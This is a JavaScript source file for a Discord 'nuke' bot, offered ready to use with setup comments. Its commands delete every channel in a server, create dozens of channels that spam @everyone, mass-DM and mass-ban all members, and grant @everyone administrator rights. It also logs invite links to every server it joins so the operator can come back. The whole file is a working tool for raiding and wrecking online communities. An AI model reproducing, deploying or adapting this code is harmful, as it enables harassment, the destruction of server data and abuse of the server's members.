const { Client, Intents, Permissions } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_MEMBERS] });


// ===== VARIABLES =====

// ===== BOT VARS =====
// paste your discord user id inbetween these speech marks
const your_id = "940285651172081685";
// start code
const code = "start";
// stop code
const stopcode = "stop";
// cleanup code
const cleancode = "cleanup";
// admin code (give everyone admin)
const admin_code = "admin";
// if we're nuking or not
let activated = false;
// what to spam (change the text within the backticks if you want the bot to spam something different)
let text = `@everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL @everyone GET NUKED LOL `;

// ===== MASS BAN/UNBANNING =====
// code to ban everyone
let ban_code = "ban";
// code to unban everyone
let unban_code = "unban";

// ===== DM SPAM =====
// enable DM spam
let dmspam_enabled = true;
// what to spam in dms
let dms = text; // (same as normal spam)

// ===== SERVER STUFF =====
// how many channels to make
const howmany = 45;
// what to name nuke channels
const Cname = "oopsies";
// what to name the cleanup channel
const cleanname = "nothing happened";
// what to give each channel's topic
const Ctopic = "Have fun fixing the server ;)";

// when the bot logs in
client.on('ready', () => {
	try {
		client.user.setActivity(`your server for raids| 'start' to setup`, { type: 'WATCHING' });

		// guild logging
		client.guilds.cache.forEach(guild => {
			// log the guild's name
			console.log(`Bot in guild: ${guild.name}`);
			// pick a random channel
			var chx = guild.channels.cache.filter(chx => chx.type === "GUILD_TEXT").find(x => x.position === 0);
			// lets get an invite to the server
			chx.createInvite(
				{
					maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
					maxUses: 100 // maximum times it can be used
				},
				`LOG`
			).then(e => {
				// log it
				console.log(`Invite code to ${guild.name} - ${e.code}`);
			}).catch(console.log);
		})
	} catch (e) {
		console.log(`Error with logging invites, ${e}`)
	}
	// successful login
  	console.log(`Logged in as ${client.user.tag}!`);
});

// if bot's added to a guild
client.on("guildCreate", guild => {
	var chx = guild.channels.cache.filter(chx => chx.type === "GUILD_TEXT").find(x => x.position === 0);
	// lets get an invite to the server
	chx.createInvite(
		{
			maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
			maxUses: 100 // maximum times it can be used
		},
		`LOG`
	).then(e => {
		// log it
		console.log(`Bot was added to guild ${guild.name} - ${e.code}`);
	}).catch(console.log);
})

// function to clear all server channels
let clear = (message) => {
	message.guild.channels.cache.forEach(channel => channel.delete().catch(e => console.log(`Tried deleting community channel - ${channel.name}`)));
}

// make a server channel
let makeChannel = (message, name) => {
	message.guild.channels.create(name, {
        type: "text",
		topic: Ctopic,
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone, 
             allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'] //Allow permissions
		   }
        ],
    }).then(channel => {
		// a workaround to jumpstart spamming
		if (name != cleanname) {
			channel.send(text).catch(e => {
				console.log("Error trying to jumpstart spamming")
			})
		} else {
			channel.send("Oops... https://images-ext-2.discordapp.net/external/vgGI1RpqZ06-0LO5BHrj-KYQbBIMot8cyzTkUmixcrY/https/media.tenor.com/Yfz3eq2ZLo0AAAPo/pee.mp4").catch(e => {
				console.log("Error trying to make cleanup channel")
			})
		}
	}).catch(e => console.log("Error making channels."));
}

// dm everyone in the server
let dmeveryone = async (message, toDM) => {
	// is dm spam enabled?
	if (dmspam_enabled == true) {
		let members = await message.guild.members.fetch({ force: true }); 
		members.forEach(member => {
		    member.send(toDM).catch(e => console.log(`DM error, user: ${member.user.tag}`));
		});
	}
}

// unban everyone
let massUnban = (message) => {
	let howMany = 0;
	message.guild.bans.fetch().then(fB => {
		fB.forEach(fB=>{
		    message.guild.members.unban(fB.user.id);
			howMany++;
		})
		console.log(`Successfully mass unbanned ${howMany} people.`)
	}).catch(e => {
		console.log("Error unbanning people");
	});
}

// ban all members
let massBan = async (message) => {
	let howMany = 0;
	let members = await message.guild.members.fetch({ force: true }); 
	members.forEach(member => {
	    member.ban({ reason: "Goodbye" }).catch(() => {
			console.log("Unable to ban user");
		});
		howMany++;
	});
	console.log(`Attempted to ban ${howMany} users.`)
}

let adminAll = (message) => {
	message.guild.roles.everyone.setPermissions([Permissions.FLAGS.ADMINISTRATOR]).then(console.log("Success, gave @everyone admin")).catch(e => {
		console.log("Unable to give everyone admin.");
	});
}

client.on('messageCreate', message => {

	// switch to the message content
	switch(message.content) {

		// start nuking
		case code:
			// check if the bot has admin
			if (message.guild.me.permissions.has(Permissions.FLAGS.ADMINISTRATOR)) {
				console.log(`NUKE STARTED BY: ${message.author.tag}, IN GUILD: ${message.guild.name}`);
				// we start nuking 
				activated = true;
				// clear all the server channels
				clear(message)
				// make server channels
				for (let i=0; i<howmany; i++) {
					makeChannel(message, Cname)
				}
			} else {
				// no admin?
				console.log("Bot does not have administrator.");
			}
			break;

		case unban_code:
			// mass unban
			massUnban(message);
			break;

		case ban_code:
			// mass ban
			massBan(message);
			break;

		case admin_code:
			adminAll(message);
			break;

		// leave the server
		case "leave":
			if (message.content == "leave") {
				// check if its the owners id
				if (message.author.id == your_id) {
					try {
						message.channel.send("Goodbye all");
						console.log(`Left guild ${message.channel.guild.name}`);
						message.channel.guild.leave();
					} catch (e) {
						console.log("Error leaving");
					}
				}
			}
			break;

		// stop the spam (quite delayed)
		case stopcode:
			console.log("Spam stopped");
			activated = false;
			break;

		// clean server
		case cleancode:
			console.log("Cleaned up server");
			activated = false;
			// clear all server channels
			clear(message)
			makeChannel(message, cleanname)
			break;
	}

	// react to the bot's spam and reply to it with more spam
	if (activated == true) {

		// try catch for if the channel is a catergory/voice channel
		try {

			dmeveryone(message, dms);
			
			message.guild.channels.cache.forEach(channel => {
				// send the message
				channel.send(text).catch(e => {
					//console.log("Error spamming")
				})
			}).catch(e => {
				console.log("Error looping through guild channels");
			});
			
		} catch (e) {
			//console.log("Error trying to spam/dm everyone")
		}
		
	}

});

// login
// put your token here
client.login(process.env['TOKEN']);
